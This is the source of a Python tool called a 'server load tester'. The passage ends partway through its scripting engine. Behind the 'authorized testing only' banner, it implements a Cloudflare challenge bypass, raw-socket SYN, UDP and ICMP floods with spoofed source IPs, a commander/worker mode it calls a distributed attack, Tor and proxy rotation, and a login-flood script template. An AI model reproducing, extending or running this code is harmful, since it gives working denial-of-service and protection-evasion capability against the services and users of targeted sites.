#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║     Server Load Tester v4 — Ultimate Edition                            ║
║                                                                           ║
║  Cloudflare Bypass (CFB) + Auto Challenge Solver                         ║
║  Layer 3/4 Attacks (SYN Flood / UDP Flood / ICMP)                        ║
║  Distributed Mode (Commander + Worker)                                    ║
║  HTTP/2 with httpx (fallback to aiohttp)                                  ║
║  Tor Integration + Proxy Rotation                                         ║
║  Scripting Engine (JSON-based)                                            ║
║  Smart Crash Mode (adaptive pressure escalation)                          ║
║  Live Request Log + Interactive Keyboard Controls (+/-)                   ║
║  All v2/v3 features (Keep-Alive, ViewState Cache, Weighted Targeting)    ║
║                                                                           ║
║  FOR AUTHORIZED TESTING ONLY!                                             ║
╚═══════════════════════════════════════════════════════════════════════════╝

Usage:
  python combined_tester_v4.py                                    # Direct run
  python combined_tester_v4.py --max-workers 2000                 # More workers
  python combined_tester_v4.py --slowloris                       # Slowloris
  python combined_tester_v4.py --cfb                             # Cloudflare Bypass
  python combined_tester_v4.py --tor                             # Use Tor
  python combined_tester_v4.py --proxy-file proxies.txt          # Proxy rotation
  python combined_tester_v4.py --http2                           # HTTP/2
  python combined_tester_v4.py --syn-flood                       # SYN Flood (needs root)
  python combined_tester_v4.py --udp-flood                       # UDP Flood (needs root)
  python combined_tester_v4.py --commander --port 9999           # Commander mode
  python combined_tester_v4.py --worker commander-ip:9999        # Worker mode
  python combined_tester_v4.py --script test_script.json         # Custom script

Keyboard Controls (during run):
  +   Increase workers (+step)
  -   Decrease workers (-step)
  q   Quit gracefully

Requirements:
  pip install aiohttp httpx[http2] aiohttp-socks
  # For SYN/UDP: pip install scapy (needs root)
"""

import asyncio
import argparse
import time
import statistics
import sys
import signal
import json
import random
import string
import re
import struct
import socket
import hashlib
import math
import os
import tty
import termios
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Set, Tuple, Any
from collections import deque
from urllib.parse import urlparse, urljoin, urlencode

# ═══════════════════════════════════════════════════════════════════════════════
# Dependency Check — graceful degradation
# ═══════════════════════════════════════════════════════════════════════════════

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False
    print("[WARN] aiohttp not installed: pip install aiohttp")

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

try:
    from aiohttp_socks import ProxyConnector
    HAS_AIOHTTP_SOCKS = True
except ImportError:
    HAS_AIOHTTP_SOCKS = False

try:
    import socks as pysocks
    HAS_PYSOCKS = True
except ImportError:
    HAS_PYSOCKS = False

if not HAS_AIOHTTP:
    print("[ERROR] aiohttp is required! pip install aiohttp")
    sys.exit(1)


# ═══════════════════════════════════════════════════════════════════════════════
# Colors
# ═══════════════════════════════════════════════════════════════════════════════

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; BD = '\033[1m'
    DM = '\033[2m'; RS = '\033[0m'

    # Additional helpers for TUI
    @staticmethod
    def dim(text):
        return f'\033[2m{text}\033[0m'

    @staticmethod
    def clear_line():
        return '\033[2K'

    @staticmethod
    def move_up(n=1):
        return f'\033[{n}A'

    @staticmethod
    def move_down(n=1):
        return f'\033[{n}B'

    @staticmethod
    def save_cursor():
        return '\033[s'

    @staticmethod
    def restore_cursor():
        return '\033[u'


# ═══════════════════════════════════════════════════════════════════════════════
# User-Agent — larger list
# ═══════════════════════════════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Edg/122.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0",
    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Vivaldi/6.5",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
]

def random_ua() -> str:
    return random.choice(USER_AGENTS)


# ═══════════════════════════════════════════════════════════════════════════════
# Helper Functions
# ═══════════════════════════════════════════════════════════════════════════════

def rand_user(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def rand_pass(length=10):
    chars = string.ascii_letters + string.digits + "!@#$%"
    return ''.join(random.choices(chars, k=length))

def rand_cache_bust() -> str:
    return f"_={random.randint(100000, 999999)}"


# ═══════════════════════════════════════════════════════════════════════════════
# Live Request Log — thread-safe rolling buffer
# ═══════════════════════════════════════════════════════════════════════════════

class LiveLog:
    """Rolling buffer of recent request results for TUI display"""

    def __init__(self, max_lines: int = 8):
        self.max_lines = max_lines
        self._lines: deque = deque(maxlen=max_lines)
        self._lock = asyncio.Lock()

    async def add(self, mode: str, status: Optional[int], rt: float,
                  err: Optional[str] = None, url: str = "", hint: str = ""):
        async with self._lock:
            ts = time.strftime("%H:%M:%S")
            self._lines.append({
                'ts': ts, 'mode': mode, 'status': status, 'rt': rt,
                'err': err, 'url': url, 'hint': hint,
            })

    def get_lines(self) -> List[dict]:
        return list(self._lines)

    def format_line(self, entry: dict) -> str:
        mode_colors = {
            'login': C.CY, 'page': C.B, 'resource': C.M,
            'slowloris': C.Y, 'script': C.G, 'http2': C.CY,
        }
        mode_icons = {
            'login': 'AUTH', 'page': 'PAGE', 'resource': 'RES ',
            'slowloris': 'SLOW', 'script': 'SCR ', 'http2': 'H2  ',
        }
        mc = mode_colors.get(entry['mode'], C.W)
        icon = mode_icons.get(entry['mode'], '????')
        status = entry['status']

        if status is not None:
            if status < 300:
                sc = C.G
            elif status < 400:
                sc = C.Y
            elif status < 500:
                sc = C.Y
            else:
                sc = C.R
            status_str = f"{sc}{status:>3}{C.RS}"
        else:
            status_str = f"{C.R}ERR{C.RS}"

        rt = entry['rt']
        if rt < 0.5:
            rtc = C.G
        elif rt < 2.0:
            rtc = C.Y
        else:
            rtc = C.R
        rt_str = f"{rtc}{rt*1000:>6.0f}ms{C.RS}"

        err_str = ""
        if entry['err']:
            err_str = f" {C.R}[{entry['err']}]{C.RS}"

        # Truncate URL
        url = entry.get('url', '')
        if len(url) > 50:
            url = "..." + url[-47:]

        hint = entry.get('hint', '')
        if hint and not entry['err']:
            hint_str = f" {C.DM}{hint[:30]}{C.RS}"
        else:
            hint_str = ""

        return (f"  {C.DM}{entry['ts']}{C.RS} {mc}{icon}{C.RS} "
                f"{status_str} {rt_str} {C.DM}{url[:50]}{C.RS}{err_str}{hint_str}")


# ═══════════════════════════════════════════════════════════════════════════════
# Keyboard Input Handler (non-blocking)
# ═══════════════════════════════════════════════════════════════════════════════

class KeyboardHandler:
    """Non-blocking keyboard input handler using raw terminal mode"""

    def __init__(self):
        self._fd = None
        self._old_settings = None
        self._queue: deque = deque(maxlen=32)
        self._running = False
        self._task = None

    async def start(self):
        self._running = True
        try:
            self._fd = sys.stdin.fileno()
            self._old_settings = termios.tcgetattr(self._fd)
            tty.setraw(self._fd)
        except Exception:
            # Fallback: if terminal doesn't support raw mode
            self._old_settings = None
            return
        self._task = asyncio.create_task(self._read_loop())

    async def _read_loop(self):
        """Read keypresses asynchronously"""
        loop = asyncio.get_event_loop()
        while self._running:
            try:
                # Use run_in_executor to avoid blocking the event loop
                ch = await loop.run_in_executor(None, self._read_char)
                if ch:
                    self._queue.append(ch)
            except Exception:
                await asyncio.sleep(0.1)

    def _read_char(self) -> Optional[str]:
        """Read a single character from stdin"""
        try:
            ch = sys.stdin.read(1)
            return ch
        except Exception:
            return None

    def get_key(self) -> Optional[str]:
        """Get the last key pressed (non-blocking)"""
        keys = []
        while self._queue:
            keys.append(self._queue.popleft())
        # Process key sequences
        for key in keys:
            if key == '+' or key == '=':
                return '+'
            elif key == '-' or key == '_':
                return '-'
            elif key == 'q' or key == 'Q':
                return 'q'
            elif key == '\x03':  # Ctrl+C
                return 'q'
            elif key == '\x1b':  # Escape sequence start
                # Skip escape sequences (arrow keys etc.)
                continue
        return None

    async def stop(self):
        self._running = False
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
        if self._old_settings and self._fd:
            try:
                termios.tcsetattr(self._fd, termios.TCSADRAIN, self._old_settings)
            except Exception:
                pass


# ═══════════════════════════════════════════════════════════════════════════════
# Cloudflare Bypass
# ═══════════════════════════════════════════════════════════════════════════════

class CloudflareBypass:
    """
    Bypass Cloudflare "I'm Under Attack" Mode

    Method:
    1. Initial request -> 503 + JS Challenge
    2. Extract challenge parameters (jschl_vc, pass, etc.)
    3. Calculate JS formula in Python
    4. Receive and cache cf_clearance cookie
    """

    def __init__(self):
        self.cf_cookies: Dict[str, str] = {}
        self.cf_cookie_ts: float = 0
        self.cf_cookie_ttl: float = 1800  # 30 minutes
        self.solved_count: int = 0
        self.fail_count: int = 0

    def is_cf_challenge(self, status: int, body: str, headers: dict) -> bool:
        if status != 503:
            return False
        cf_ray = headers.get('CF-Ray', '') if headers else ''
        indicators = [
            'cf-browser-verification', 'cf_chl_opt', 'challenge-platform',
            'Checking your browser', 'Please Wait... | Cloudflare',
            'Enable JavaScript and cookies to continue', '_cf_chl_opt',
            'cf-challenge-run',
        ]
        body_lower = body.lower() if body else ''
        for ind in indicators:
            if ind.lower() in body_lower:
                return True
        if cf_ray and status == 503:
            return True
        return False

    def _extract_challenge_params(self, body: str) -> Optional[Dict[str, str]]:
        params = {}
        opt_match = re.search(r'_cf_chl_opt\s*=\s*\{([^}]+)\}', body)
        if opt_match:
            opt_text = opt_match.group(1)
            for key_match in re.finditer(r"(\w+)\s*:\s*'([^']*)'", opt_text):
                params[key_match.group(1)] = key_match.group(2)
            for key_match in re.finditer(r'(\w+)\s*:\s*"([^"]*)"', opt_text):
                params[key_match.group(1)] = key_match.group(2)
        vc_match = re.search(r'name="jschl_vc"\s*value="([^"]*)"', body)
        if vc_match:
            params['jschl_vc'] = vc_match.group(1)
        pass_match = re.search(r'name="pass"\s*value="([^"]*)"', body)
        if pass_match:
            params['pass'] = pass_match.group(1)
        s_match = re.search(r'name="s"\s*value="([^"]*)"', body)
        if s_match:
            params['s'] = s_match.group(1)
        return params if params else None

    def _solve_js_challenge(self, body: str, domain: str) -> Optional[float]:
        try:
            challenge_pattern = re.search(
                r'var\s+s\s*,\s*t\s*,\s*o\s*,\s*p\s*,\s*b\s*,\s*r\s*,\s*e\s*,\s*a\s*;\s*(.+?)f\.submit',
                body, re.DOTALL
            )
            if not challenge_pattern:
                challenge_pattern = re.search(
                    r't\s*=\s*[a-z]+\.[a-z]+\([^)]+\);\s*(.+?)document\.getElementById',
                    body, re.DOTALL
                )
            if not challenge_pattern:
                return None

            js_code = challenge_pattern.group(1)
            replacements = {
                'Math.floor': 'math.floor', 'Math.ceil': 'math.ceil',
                'Math.round': 'math.round', 'Math.abs': 'abs',
                'parseInt': 'int', 'parseFloat': 'float',
                '!![]': 'True', '![]': 'False', '[]': '0',
                '(!![])': '1', '(![])': '0', '+!![]': '+1', '+![]': '+0',
            }
            py_code = js_code
            for js, py in replacements.items():
                py_code = py_code.replace(js, py)

            if any(danger in py_code for danger in ['import', 'exec', 'eval', 'open', '__', 'os.']):
                return None

            try:
                local_vars = {'math': math, 'abs': abs, 'int': int, 'float': float, 'True': True, 'False': False}
                result = eval(py_code, {"__builtins__": {}}, local_vars)
                result += len(domain)
                return float(result)
            except Exception:
                return None
        except Exception:
            return None

    async def solve_challenge(self, session, url: str, body: str, headers: dict) -> Optional[Dict[str, str]]:
        parsed = urlparse(url)
        domain = parsed.netloc.split(':')[0]
        try:
            params = self._extract_challenge_params(body)
            if not params:
                self.fail_count += 1
                return None
            answer = self._solve_js_challenge(body, domain)
            if answer is None:
                await asyncio.sleep(5)
                self.fail_count += 1
                return None
            challenge_url = f"{parsed.scheme}://{parsed.netloc}/cdn-cgi/l/chk_jschl"
            form_data = {
                'jschl_vc': params.get('jschl_vc', ''),
                'pass': params.get('pass', ''),
                'jschl_answer': str(answer),
            }
            if 's' in params:
                form_data['s'] = params['s']
            cf_headers = {
                'User-Agent': random_ua(), 'Referer': url,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive',
            }
            async with session.post(challenge_url, headers=cf_headers, data=form_data,
                                    ssl=False, allow_redirects=True) as resp:
                cookies = {}
                for cookie in session.cookie_jar:
                    if cookie.key == 'cf_clearance':
                        cookies['cf_clearance'] = cookie.value
                        self.cf_cookies[domain] = cookie.value
                        self.cf_cookie_ts = time.time()
                        self.solved_count += 1
                        break
                return cookies if cookies else None
        except Exception:
            self.fail_count += 1
            return None

    def get_cached_cookies(self, domain: str) -> Optional[Dict[str, str]]:
        now = time.time()
        if now - self.cf_cookie_ts > self.cf_cookie_ttl:
            return None
        if domain in self.cf_cookies:
            return {'cf_clearance': self.cf_cookies[domain]}
        return None


# ═══════════════════════════════════════════════════════════════════════════════
# Layer 3/4 Attacks (SYN / UDP / ICMP)
# ═══════════════════════════════════════════════════════════════════════════════

class Layer34Attacker:
    """
    Network and transport layer attacks

    WARNING: Requires root access and raw socket
    FOR AUTHORIZED TESTING ONLY!
    """

    def __init__(self, target_ip: str, target_port: int = 80):
        self.target_ip = target_ip
        self.target_port = target_port
        self._stop = asyncio.Event()
        self.stats = {'syn_sent': 0, 'udp_sent': 0, 'icmp_sent': 0, 'errors': 0}

    def stop(self):
        self._stop.set()

    @staticmethod
    def _checksum(data: bytes) -> int:
        if len(data) % 2:
            data += b'\x00'
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i + 1]
            s += w
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        return ~s & 0xffff

    def _build_syn_packet(self, src_ip: str, src_port: int, dst_ip: str, dst_port: int) -> bytes:
        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45, 0, 40, random.randint(0, 65535), 0x4000, 64, 6, 0,
            socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
        ip_checksum = self._checksum(ip_header)
        ip_header = ip_header[:10] + struct.pack('!H', ip_checksum) + ip_header[12:]
        tcp_header = struct.pack('!HHIIBBHHH',
            src_port, dst_port, random.randint(0, 0xFFFFFFFF),
            0, 0x50, 0x02, 65535, 0, 0)
        pseudo = struct.pack('!4s4sBBH',
            socket.inet_aton(src_ip), socket.inet_aton(dst_ip), 0, 6, len(tcp_header))
        tcp_checksum = self._checksum(pseudo + tcp_header)
        tcp_header = tcp_header[:16] + struct.pack('!H', tcp_checksum) + tcp_header[18:]
        return ip_header + tcp_header

    def _build_udp_packet(self, src_ip: str, src_port: int, dst_ip: str, dst_port: int, payload: bytes) -> bytes:
        udp_length = 8 + len(payload)
        udp_header = struct.pack('!HHHH', src_port, dst_port, udp_length, 0)
        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45, 0, 20 + udp_length, random.randint(0, 65535), 0x4000, 64, 17, 0,
            socket.inet_aton(src_ip), socket.inet_aton(dst_ip))
        ip_checksum = self._checksum(ip_header)
        ip_header = ip_header[:10] + struct.pack('!H', ip_checksum) + ip_header[12:]
        return ip_header + udp_header + payload

    def _build_icmp_packet(self, dst_ip: str) -> bytes:
        icmp_header = struct.pack('!BBHHH', 8, 0, 0, random.randint(0, 0xFFFF), random.randint(0, 0xFFFF))
        payload = os.urandom(56)
        checksum = self._checksum(icmp_header + payload)
        icmp_header = icmp_header[:2] + struct.pack('!H', checksum) + icmp_header[4:]
        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45, 0, 20 + 8 + 56, random.randint(0, 65535), 0x4000, 64, 1, 0,
            socket.inet_aton(self._random_ip()), socket.inet_aton(dst_ip))
        ip_checksum = self._checksum(ip_header)
        ip_header = ip_header[:10] + struct.pack('!H', ip_checksum) + ip_header[12:]
        return ip_header + icmp_header + payload

    @staticmethod
    def _random_ip() -> str:
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    async def syn_flood(self, pps: int = 1000):
        if os.geteuid() != 0:
            print(f"  {C.R}[ERROR] SYN Flood requires root access! (sudo){C.RS}")
            return
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print(f"  {C.R}[ERROR] Raw socket access denied!{C.RS}")
            return
        print(f"  {C.R}[SYN] SYN Flood started -> {self.target_ip}:{self.target_port} ({pps} pps){C.RS}")
        interval = 1.0 / pps
        while not self._stop.is_set():
            try:
                src_ip = self._random_ip()
                src_port = random.randint(1024, 65535)
                packet = self._build_syn_packet(src_ip, src_port, self.target_ip, self.target_port)
                raw_sock.sendto(packet, (self.target_ip, self.target_port))
                self.stats['syn_sent'] += 1
                await asyncio.sleep(interval)
            except Exception:
                self.stats['errors'] += 1
                await asyncio.sleep(0.001)
        raw_sock.close()

    async def udp_flood(self, pps: int = 1000, payload_size: int = 1024):
        if os.geteuid() != 0:
            print(f"  {C.R}[ERROR] UDP Flood requires root access! (sudo){C.RS}")
            return
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print(f"  {C.R}[ERROR] Raw socket access denied!{C.RS}")
            return
        print(f"  {C.R}[UDP] UDP Flood started -> {self.target_ip}:{self.target_port} ({pps} pps, {payload_size}B){C.RS}")
        payload = os.urandom(payload_size)
        interval = 1.0 / pps
        while not self._stop.is_set():
            try:
                src_ip = self._random_ip()
                src_port = random.randint(1024, 65535)
                packet = self._build_udp_packet(src_ip, src_port, self.target_ip, self.target_port, payload)
                raw_sock.sendto(packet, (self.target_ip, self.target_port))
                self.stats['udp_sent'] += 1
                await asyncio.sleep(interval)
            except Exception:
                self.stats['errors'] += 1
                await asyncio.sleep(0.001)
        raw_sock.close()

    async def icmp_flood(self, pps: int = 500):
        if os.geteuid() != 0:
            print(f"  {C.R}[ERROR] ICMP Flood requires root access!{C.RS}")
            return
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            return
        print(f"  {C.R}[ICMP] ICMP Flood started -> {self.target_ip} ({pps} pps){C.RS}")
        interval = 1.0 / pps
        while not self._stop.is_set():
            try:
                packet = self._build_icmp_packet(self.target_ip)
                raw_sock.sendto(packet, (self.target_ip, 0))
                self.stats['icmp_sent'] += 1
                await asyncio.sleep(interval)
            except Exception:
                self.stats['errors'] += 1
                await asyncio.sleep(0.001)
        raw_sock.close()


# ═══════════════════════════════════════════════════════════════════════════════
# Distributed Mode
# ═══════════════════════════════════════════════════════════════════════════════

DISTRIBUTED_PORT = 9876

class Commander:
    """
    Commander: coordinator for distributed attack

    Protocol:
      Commander -> Worker: {"type":"config", "url":"...", "workers":1000, ...}
      Commander -> Worker: {"type":"start"}
      Commander -> Worker: {"type":"stop"}
      Worker -> Commander: {"type":"stats", "total":1234, "ok":1000, ...}
      Worker -> Commander: {"type":"heartbeat", "id":"worker-1"}
    """

    def __init__(self, port: int = DISTRIBUTED_PORT):
        self.port = port
        self.workers: Dict[str, dict] = {}
        self._stop = asyncio.Event()
        self.config: Dict[str, Any] = {}
        self.aggregated_stats = {
            'total': 0, 'ok': 0, 'fail': 0, 'rps': 0.0,
            'workers_online': 0,
        }

    def stop(self):
        self._stop.set()

    async def start(self, config: Dict[str, Any]):
        self.config = config
        server = await asyncio.start_server(self._handle_worker, '0.0.0.0', self.port)
        print(f"\n  {C.G}[CMD] Commander started on port {self.port}{C.RS}")
        print(f"  {C.CY}[CMD] Workers should connect:{C.RS}")
        print(f"     python combined_tester_v4.py --worker {self._get_local_ip()}:{self.port}")
        print(f"\n  {C.Y}[CMD] Waiting for workers... (Ctrl+C to start){C.RS}")
        try:
            while not self._stop.is_set():
                await asyncio.sleep(1)
                if len(self.workers) > 0:
                    print(f"\r  [CMD] {len(self.workers)} workers connected  ", end="", flush=True)
        except KeyboardInterrupt:
            pass
        if self.workers:
            print(f"\n  {C.G}[CMD] Sending start command to {len(self.workers)} workers...{C.RS}")
            await self._broadcast_config()
            await self._broadcast_start()
            while not self._stop.is_set():
                self._update_aggregated()
                print(
                    f"\r  [DIST] Workers:{len(self.workers)} | "
                    f"Total:{self.aggregated_stats['total']:,} | "
                    f"OK:{self.aggregated_stats['ok']:,} | "
                    f"FAIL:{self.aggregated_stats['fail']:,} | "
                    f"RPS:{self.aggregated_stats['rps']:.0f}/s ",
                    end="", flush=True
                )
                await asyncio.sleep(2)
        server.close()
        await server.wait_closed()

    async def _handle_worker(self, reader, writer):
        worker_id = f"worker-{len(self.workers)+1}"
        self.workers[worker_id] = {'reader': reader, 'writer': writer, 'stats': {}}
        addr = writer.get_extra_info('peername')
        print(f"\n  {C.G}[CMD] Worker connected: {addr[0]} (id: {worker_id}){C.RS}")
        try:
            while not self._stop.is_set():
                data = await reader.read(4096)
                if not data:
                    break
                try:
                    msg = json.loads(data.decode())
                    if msg.get('type') == 'stats':
                        self.workers[worker_id]['stats'] = msg
                    elif msg.get('type') == 'heartbeat':
                        pass
                except json.JSONDecodeError:
                    pass
        except Exception:
            pass
        finally:
            if worker_id in self.workers:
                del self.workers[worker_id]
            print(f"\n  {C.Y}[CMD] Worker disconnected: {worker_id}{C.RS}")
            writer.close()

    async def _broadcast_config(self):
        msg = json.dumps({**self.config, 'type': 'config'}).encode()
        for wid, w in list(self.workers.items()):
            try:
                w['writer'].write(msg + b'\n')
                await w['writer'].drain()
            except Exception:
                pass

    async def _broadcast_start(self):
        msg = json.dumps({'type': 'start'}).encode()
        for wid, w in list(self.workers.items()):
            try:
                w['writer'].write(msg + b'\n')
                await w['writer'].drain()
            except Exception:
                pass

    def _update_aggregated(self):
        total = ok = fail = 0
        for w in self.workers.values():
            s = w.get('stats', {})
            total += s.get('total', 0)
            ok += s.get('ok', 0)
            fail += s.get('fail', 0)
        self.aggregated_stats = {
            'total': total, 'ok': ok, 'fail': fail,
            'rps': total / max(time.time() - self.config.get('t0', time.time()), 1),
            'workers_online': len(self.workers),
        }

    @staticmethod
    def _get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "0.0.0.0"


class Worker:
    """Worker: connects to Commander and executes attack based on received config"""

    def __init__(self, commander_addr: str):
        parts = commander_addr.split(':')
        self.host = parts[0]
        self.port = int(parts[1]) if len(parts) > 1 else DISTRIBUTED_PORT
        self._stop = asyncio.Event()
        self.config: Dict[str, Any] = {}

    def stop(self):
        self._stop.set()

    async def start(self):
        print(f"  {C.CY}[WRK] Connecting to Commander {self.host}:{self.port}...{C.RS}")
        try:
            reader, writer = await asyncio.open_connection(self.host, self.port)
        except Exception as e:
            print(f"  {C.R}[ERROR] Connection failed: {e}{C.RS}")
            return
        print(f"  {C.G}[WRK] Connected to Commander! Waiting for config...{C.RS}")

        async def send_heartbeat():
            while not self._stop.is_set():
                try:
                    msg = json.dumps({'type': 'heartbeat', 'id': 'worker'}).encode()
                    writer.write(msg + b'\n')
                    await writer.drain()
                    await asyncio.sleep(5)
                except Exception:
                    break
        asyncio.create_task(send_heartbeat())

        try:
            started = False
            tester = None
            while not self._stop.is_set():
                data = await reader.read(8192)
                if not data:
                    break
                for line in data.decode().split('\n'):
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        msg = json.loads(line)
                    except json.JSONDecodeError:
                        continue
                    if msg.get('type') == 'config':
                        self.config = msg
                        print(f"  {C.G}[WRK] Config received: {msg.get('url', '?')}{C.RS}")
                    elif msg.get('type') == 'start' and not started:
                        started = True
                        print(f"  {C.R}[WRK] Attack started!{C.RS}")
                        tester = CombinedTester(
                            login_url=self.config.get('url', ''),
                            timeout=self.config.get('timeout', 20),
                            safe_max=self.config.get('safe_max', 10000),
                            enable_slowloris=self.config.get('slowloris', False),
                            enable_cfb=self.config.get('cfb', False),
                            enable_http2=self.config.get('http2', False),
                            tor_enabled=self.config.get('tor', False),
                            proxy_file=self.config.get('proxy_file', None),
                        )
                        asyncio.create_task(tester.run(
                            max_workers=self.config.get('max_workers', 1000),
                            step=self.config.get('step', 100),
                            step_dur=self.config.get('step_dur', 5),
                        ))
                        async def send_stats():
                            while not self._stop.is_set():
                                try:
                                    st = tester.stats
                                    stats_msg = json.dumps({
                                        'type': 'stats',
                                        'total': st.total, 'ok': st.ok,
                                        'fail': st.fail, 'rps': st.rrps,
                                    }).encode()
                                    writer.write(stats_msg + b'\n')
                                    await writer.drain()
                                except Exception:
                                    pass
                                await asyncio.sleep(2)
                        asyncio.create_task(send_stats())
                    elif msg.get('type') == 'stop':
                        if tester:
                            tester.stop()
                        self._stop.set()
        except Exception as e:
            print(f"  {C.R}[ERROR] {e}{C.RS}")
        finally:
            writer.close()


# ═══════════════════════════════════════════════════════════════════════════════
# Scripting Engine
# ═══════════════════════════════════════════════════════════════════════════════

class ScriptEngine:
    """
    Lightweight scripting engine (like k6)

    JSON format:
    {
      "name": "ASP.NET Login Flood",
      "base_url": "https://target.com",
      "steps": [
        {"action": "get", "path": "/Login.aspx", "extract": {"viewstate": "__VIEWSTATE"}},
        {"action": "post", "path": "/Login.aspx",
         "data": {"username": "{{rand_user}}", "password": "{{rand_pass}}"},
         "expect": [302, 200]}
      ],
      "loop": true,
      "delay_ms": 10
    }

    Built-in variables:
      {{rand_user}}  -> random username
      {{rand_pass}}  -> random password
      {{rand_int}}   -> random integer
      {{timestamp}}  -> current timestamp
      {{cache_bust}} -> cache buster parameter
    """

    BUILTIN_VARS = {
        'rand_user': lambda: rand_user(),
        'rand_pass': lambda: rand_pass(),
        'rand_int': lambda: str(random.randint(1, 999999)),
        'timestamp': lambda: str(int(time.time())),
        'cache_bust': lambda: rand_cache_bust(),
        'rand_email': lambda: f"{rand_user()}@{random.choice(['gmail.com','yahoo.com','outlook.com'])}",
        'rand_phone': lambda: f"09{random.randint(100000000, 999999999)}",
    }

    def __init__(self, script_path: str):
        self.script_path = script_path
        self.script: Dict[str, Any] = {}
        self.variables: Dict[str, str] = {}
        self._load()

    def _load(self):
        with open(self.script_path, 'r', encoding='utf-8') as f:
            self.script = json.load(f)
        print(f"  {C.G}[SCR] Script loaded: {self.script.get('name', 'Unnamed')}{C.RS}")
        steps = self.script.get('steps', [])
        print(f"  [SCR] Steps: {len(steps)}")
        for i, step in enumerate(steps):
            print(f"     {i+1}. {step.get('action','?').upper()} {step.get('path','/')}")

    def _resolve_vars(self, text: str) -> str:
        if not isinstance(text, str):
            return text
        for var_name, var_func in self.BUILTIN_VARS.items():
            text = text.replace(f'{{{{{var_name}}}}}', var_func())
        for var_name, var_value in self.variables.items():
            text = text.replace(f'{{{{{var_name}}}}}', var_value)
        return text

    def _resolve_dict(self, data: Dict) -> Dict:
        resolved = {}
        for k, v in data.items():
            if isinstance(v, str):
                resolved[k] = self._resolve_vars(v)
            elif isinstance(v, dict):
                resolved[k] = self._resolve_dict(v)
